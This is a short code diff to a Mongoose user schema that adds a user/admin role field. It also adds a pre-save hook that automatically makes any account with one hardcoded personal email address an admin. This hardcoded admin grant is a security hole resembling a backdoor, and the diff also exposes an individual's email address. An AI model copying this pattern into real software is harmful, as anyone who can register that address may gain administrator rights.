@@ -23,6 +23,11 @@ const UserSchema = new mongoose.Schema({
     type: String,
     default: '',
   },
+  role: {
+    type: String,
+    enum: ['user', 'admin'],
+    default: 'user',
+  },
   provider: {
     type: String,
     enum: ['credentials', 'google'],
@@ -45,6 +50,9 @@ const UserSchema = new mongoose.Schema({
 
 UserSchema.pre('save', function (next) {
   this.updatedAt = new Date();
+  if (this.email && this.email.toLowerCase().trim() === 'nitinbhagatxyz@gmail.com') {
+    this.role = 'admin';
+  }
   if (typeof next === 'function') next();
 });
 
